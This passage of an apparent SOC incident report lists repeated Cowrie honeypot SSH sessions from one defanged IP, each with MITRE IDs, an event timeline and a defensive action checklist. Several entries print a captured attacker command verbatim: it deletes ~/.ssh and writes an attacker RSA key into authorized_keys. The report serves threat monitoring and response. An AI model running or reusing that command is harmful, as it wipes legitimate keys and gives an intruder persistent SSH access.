| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 04:56:44` | `cowrie.session.connect` |
| `2026-04-23 04:56:44` | `cowrie.client.version` |
| `2026-04-23 04:56:45` | `cowrie.client.kex` |
| `2026-04-23 04:56:45` | `cowrie.login.success` |
| `2026-04-23 04:56:46` | `cowrie.session.params` |
| `2026-04-23 04:56:46` | `cowrie.command.input` |
| `2026-04-23 04:56:46` | `cowrie.command.failed` |
| `2026-04-23 04:56:46` | `cowrie.log.closed` |
| `2026-04-23 04:56:47` | `cowrie.session.params` |
| `2026-04-23 04:56:47` | `cowrie.command.input` |
| `2026-04-23 04:56:47` | `cowrie.session.file_download` |
| `2026-04-23 04:56:47` | `cowrie.log.closed` |
| `2026-04-23 04:56:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.183.74[.]182` to AbuseIPDB if not already reported
- [ ] Block `103.183.74[.]182` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4621c2732692

| Field | Detail |
|---|---|
| **Source IP** | `103.183.74[.]182` |
| **First Seen** | 2026-04-23 04:56 |
| **Last Seen** | 2026-04-23 04:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 04:56:50` | `cowrie.session.connect` |
| `2026-04-23 04:56:50` | `cowrie.client.version` |
| `2026-04-23 04:56:50` | `cowrie.client.kex` |
| `2026-04-23 04:56:51` | `cowrie.login.success` |
| `2026-04-23 04:56:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.183.74[.]182` to AbuseIPDB if not already reported
- [ ] Block `103.183.74[.]182` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fad858c52093

| Field | Detail |
|---|---|
| **Source IP** | `103.183.74[.]182` |
| **First Seen** | 2026-04-23 05:00 |
| **Last Seen** | 2026-04-23 05:00 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 05:00:00` | `cowrie.session.connect` |
| `2026-04-23 05:00:00` | `cowrie.client.version` |
| `2026-04-23 05:00:00` | `cowrie.client.kex` |
| `2026-04-23 05:00:01` | `cowrie.login.success` |
| `2026-04-23 05:00:02` | `cowrie.session.params` |
| `2026-04-23 05:00:02` | `cowrie.command.input` |
| `2026-04-23 05:00:02` | `cowrie.command.failed` |
| `2026-04-23 05:00:02` | `cowrie.log.closed` |
| `2026-04-23 05:00:03` | `cowrie.session.params` |
| `2026-04-23 05:00:03` | `cowrie.command.input` |
| `2026-04-23 05:00:03` | `cowrie.session.file_download` |
| `2026-04-23 05:00:03` | `cowrie.log.closed` |
| `2026-04-23 05:00:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.183.74[.]182` to AbuseIPDB if not already reported
- [ ] Block `103.183.74[.]182` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-31082b45a253

| Field | Detail |
|---|---|
| **Source IP** | `103.183.74[.]182` |
| **First Seen** | 2026-04-23 05:00 |
| **Last Seen** | 2026-04-23 05:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 05:00:06` | `cowrie.session.connect` |
| `2026-04-23 05:00:06` | `cowrie.client.version` |
| `2026-04-23 05:00:06` | `cowrie.client.kex` |
| `2026-04-23 05:00:07` | `cowrie.login.success` |
| `2026-04-23 05:00:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.183.74[.]182` to AbuseIPDB if not already reported
- [ ] Block `103.183.74[.]182` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-81d1f4157f1c

| Field | Detail |
|---|---|
| **Source IP** | `103.183.74[.]182` |
| **First Seen** | 2026-04-23 05:01 |
| **Last Seen** | 2026-04-23 05:01 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 05:01:10` | `cowrie.session.connect` |
| `2026-04-23 05:01:10` | `cowrie.client.version` |
| `2026-04-23 05:01:10` | `cowrie.client.kex` |
| `2026-04-23 05:01:11` | `cowrie.login.success` |
| `2026-04-23 05:01:12` | `cowrie.session.params` |
| `2026-04-23 05:01:12` | `cowrie.command.input` |
| `2026-04-23 05:01:12` | `cowrie.command.failed` |
| `2026-04-23 05:01:12` | `cowrie.log.closed` |
| `2026-04-23 05:01:12` | `cowrie.session.params` |
| `2026-04-23 05:01:12` | `cowrie.command.input` |
| `2026-04-23 05:01:13` | `cowrie.session.file_download` |
| `2026-04-23 05:01:13` | `cowrie.log.closed` |
| `2026-04-23 05:01:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.183.74[.]182` to AbuseIPDB if not already reported
- [ ] Block `103.183.74[.]182` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-14a1c9703a44

| Field | Detail |
|---|---|
| **Source IP** | `103.183.74[.]182` |
| **First Seen** | 2026-04-23 05:01 |
| **Last Seen** | 2026-04-23 05:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 05:01:16` | `cowrie.session.connect` |
| `2026-04-23 05:01:16` | `cowrie.client.version` |
| `2026-04-23 05:01:16` | `cowrie.client.kex` |
| `2026-04-23 05:01:17` | `cowrie.login.success` |
| `2026-04-23 05:01:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.183.74[.]182` to AbuseIPDB if not already reported
- [ ] Block `103.183.74[.]182` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7af936fd7a2f

| Field | Detail |
|---|---|
| **Source IP** | `103.183.74[.]182` |
| **First Seen** | 2026-04-23 05:02 |
| **Last Seen** | 2026-04-23 05:02 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 05:02:19` | `cowrie.session.connect` |
| `2026-04-23 05:02:19` | `cowrie.client.version` |
| `2026-04-23 05:02:19` | `cowrie.client.kex` |
| `2026-04-23 05:02:20` | `cowrie.login.success` |
| `2026-04-23 05:02:20` | `cowrie.session.params` |
| `2026-04-23 05:02:20` | `cowrie.command.input` |
| `2026-04-23 05:02:20` | `cowrie.command.failed` |
| `2026-04-23 05:02:20` | `cowrie.log.closed` |
| `2026-04-23 05:02:21` | `cowrie.session.params` |
| `2026-04-23 05:02:21` | `cowrie.command.input` |
| `2026-04-23 05:02:21` | `cowrie.session.file_download` |
| `2026-04-23 05:02:21` | `cowrie.log.closed` |
| `2026-04-23 05:02:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.183.74[.]182` to AbuseIPDB if not already reported
- [ ] Block `103.183.74[.]182` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fef88c2b28d5

| Field | Detail |
|---|---|
| **Source IP** | `103.183.74[.]182` |
| **First Seen** | 2026-04-23 05:02 |
| **Last Seen** | 2026-04-23 05:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 05:02:24` | `cowrie.session.connect` |
| `2026-04-23 05:02:24` | `cowrie.client.version` |
| `2026-04-23 05:02:24` | `cowrie.client.kex` |
| `2026-04-23 05:02:25` | `cowrie.login.success` |
| `2026-04-23 05:02:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.183.74[.]182` to AbuseIPDB if not already reported
- [ ] Block `103.183.74[.]182` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-03e527a95664

| Field | Detail |
|---|---|
| **Source IP** | `103.183.74[.]182` |
| **First Seen** | 2026-04-23 05:04 |
| **Last Seen** | 2026-04-23 05:04 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 05:04:36` | `cowrie.session.connect` |
| `2026-04-23 05:04:36` | `cowrie.client.version` |
| `2026-04-23 05:04:37` | `cowrie.client.kex` |
| `2026-04-23 05:04:37` | `cowrie.login.success` |
| `2026-04-23 05:04:38` | `cowrie.session.params` |
| `2026-04-23 05:04:38` | `cowrie.command.input` |
| `2026-04-23 05:04:38` | `cowrie.command.failed` |
| `2026-04-23 05:04:38` | `cowrie.log.closed` |
| `2026-04-23 05:04:39` | `cowrie.session.params` |
| `2026-04-23 05:04:39` | `cowrie.command.input` |
| `2026-04-23 05:04:39` | `cowrie.session.file_download` |
| `2026-04-23 05:04:39` | `cowrie.log.closed` |
| `2026-04-23 05:04:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.183.74[.]182` to AbuseIPDB if not already reported
- [ ] Block `103.183.74[.]182` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe9d71a21950

| Field | Detail |
|---|---|
| **Source IP** | `103.183.74[.]182` |
| **First Seen** | 2026-04-23 05:04 |
| **Last Seen** | 2026-04-23 05:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 05:04:42` | `cowrie.session.connect` |
| `2026-04-23 05:04:42` | `cowrie.client.version` |
| `2026-04-23 05:04:42` | `cowrie.client.kex` |
| `2026-04-23 05:04:43` | `cowrie.login.success` |
| `2026-04-23 05:04:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.183.74[.]182` to AbuseIPDB if not already reported
- [ ] Block `103.183.74[.]182` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-80045312217a

| Field | Detail |
|---|---|
| **Source IP** | `103.183.74[.]182` |
| **First Seen** | 2026-04-23 05:05 |
| **Last Seen** | 2026-04-23 05:06 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 05:05:56` | `cowrie.session.connect` |
| `2026-04-23 05:05:56` | `cowrie.client.version` |
| `2026-04-23 05:05:56` | `cowrie.client.kex` |
| `2026-04-23 05:05:57` | `cowrie.login.success` |
| `2026-04-23 05:05:57` | `cowrie.session.params` |
| `2026-04-23 05:05:57` | `cowrie.command.input` |
| `2026-04-23 05:05:57` | `cowrie.command.failed` |
| `2026-04-23 05:05:57` | `cowrie.log.closed` |
| `2026-04-23 05:05:58` | `cowrie.session.params` |
| `2026-04-23 05:05:58` | `cowrie.command.input` |
| `2026-04-23 05:05:58` | `cowrie.session.file_download` |
| `2026-04-23 05:05:58` | `cowrie.log.closed` |
| `2026-04-23 05:06:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.183.74[.]182` to AbuseIPDB if not already reported
- [ ] Block `103.183.74[.]182` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-95d44ffeb5cb

| Field | Detail |
|---|---|
| **Source IP** | `103.183.74[.]182` |
| **First Seen** | 2026-04-23 05:06 |
| **Last Seen** | 2026-04-23 05:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 05:06:01` | `cowrie.session.connect` |
| `2026-04-23 05:06:01` | `cowrie.client.version` |
| `2026-04-23 05:06:01` | `cowrie.client.kex` |
| `2026-04-23 05:06:02` | `cowrie.login.success` |
| `2026-04-23 05:06:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.183.74[.]182` to AbuseIPDB if not already reported
- [ ] Block `103.183.74[.]182` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa2abc4e58ac

| Field | Detail |
|---|---|
| **Source IP** | `103.183.74[.]182` |
| **First Seen** | 2026-04-23 05:12 |
| **Last Seen** | 2026-04-23 05:12 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 05:12:22` | `cowrie.session.connect` |
| `2026-04-23 05:12:22` | `cowrie.client.version` |
| `2026-04-23 05:12:22` | `cowrie.client.kex` |
| `2026-04-23 05:12:23` | `cowrie.login.success` |
| `2026-04-23 05:12:24` | `cowrie.session.params` |
| `2026-04-23 05:12:24` | `cowrie.command.input` |
| `2026-04-23 05:12:24` | `cowrie.command.failed` |
| `2026-04-23 05:12:24` | `cowrie.log.closed` |
| `2026-04-23 05:12:24` | `cowrie.session.params` |
| `2026-04-23 05:12:24` | `cowrie.command.input` |
| `2026-04-23 05:12:25` | `cowrie.session.file_download` |
| `2026-04-23 05:12:25` | `cowrie.log.closed` |
| `2026-04-23 05:12:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.183.74[.]182` to AbuseIPDB if not already reported
- [ ] Block `103.183.74[.]182` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a050ec436d4

| Field | Detail |
|---|---|
| **Source IP** | `103.183.74[.]182` |
| **First Seen** | 2026-04-23 05:12 |
| **Last Seen** | 2026-04-23 05:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 05:12:28` | `cowrie.session.connect` |
| `2026-04-23 05:12:28` | `cowrie.client.version` |
| `2026-04-23 05:12:28` | `cowrie.client.kex` |
| `2026-04-23 05:12:29` | `cowrie.login.success` |
| `2026-04-23 05:12:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.183.74[.]182` to AbuseIPDB if not already reported
- [ ] Block `103.183.74[.]182` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-354efde5b368

| Field | Detail |
|---|---|
| **Source IP** | `103.183.74[.]182` |
| **First Seen** | 2026-04-23 05:14 |
| **Last Seen** | 2026-04-23 05:14 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 05:14:34` | `cowrie.session.connect` |
| `2026-04-23 05:14:34` | `cowrie.client.version` |
| `2026-04-23 05:14:34` | `cowrie.client.kex` |
| `2026-04-23 05:14:35` | `cowrie.login.success` |
| `2026-04-23 05:14:36` | `cowrie.session.params` |
| `2026-04-23 05:14:36` | `cowrie.command.input` |
| `2026-04-23 05:14:36` | `cowrie.command.failed` |
| `2026-04-23 05:14:36` | `cowrie.log.closed` |
| `2026-04-23 05:14:36` | `cowrie.session.params` |
| `2026-04-23 05:14:36` | `cowrie.command.input` |
| `2026-04-23 05:14:36` | `cowrie.session.file_download` |
| `2026-04-23 05:14:36` | `cowrie.log.closed` |
| `2026-04-23 05:14:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.183.74[.]182` to AbuseIPDB if not already reported
- [ ] Block `103.183.74[.]182` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-615cbc290ba0

| Field | Detail |
|---|---|
| **Source IP** | `103.183.74[.]182` |
| **First Seen** | 2026-04-23 05:14 |
| **Last Seen** | 2026-04-23 05:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 05:14:39` | `cowrie.session.connect` |
| `2026-04-23 05:14:39` | `cowrie.client.version` |
| `2026-04-23 05:14:39` | `cowrie.client.kex` |
| `2026-04-23 05:14:40` | `cowrie.login.success` |
| `2026-04-23 05:14:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.183.74[.]182` to AbuseIPDB if not already reported
- [ ] Block `103.183.74[.]182` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-30b230e4f4b0

| Field | Detail |
|---|---|
| **Source IP** | `103.183.74[.]182` |
| **First Seen** | 2026-04-23 05:17 |
| **Last Seen** | 2026-04-23 05:17 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 05:17:49` | `cowrie.session.connect` |
| `2026-04-23 05:17:49` | `cowrie.client.version` |
| `2026-04-23 05:17:49` | `cowrie.client.kex` |
| `2026-04-23 05:17:50` | `cowrie.login.success` |
| `2026-04-23 05:17:51` | `cowrie.session.params` |
| `2026-04-23 05:17:51` | `cowrie.command.input` |
| `2026-04-23 05:17:51` | `cowrie.command.failed` |
| `2026-04-23 05:17:51` | `cowrie.log.closed` |
| `2026-04-23 05:17:51` | `cowrie.session.params` |
| `2026-04-23 05:17:51` | `cowrie.command.input` |
| `2026-04-23 05:17:52` | `cowrie.session.file_download` |
| `2026-04-23 05:17:52` | `cowrie.log.closed` |
| `2026-04-23 05:17:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.183.74[.]182` to AbuseIPDB if not already reported
- [ ] Block `103.183.74[.]182` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d4b144589622

| Field | Detail |
|---|---|
| **Source IP** | `103.183.74[.]182` |
| **First Seen** | 2026-04-23 05:17 |
| **Last Seen** | 2026-04-23 05:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 05:17:54` | `cowrie.session.connect` |
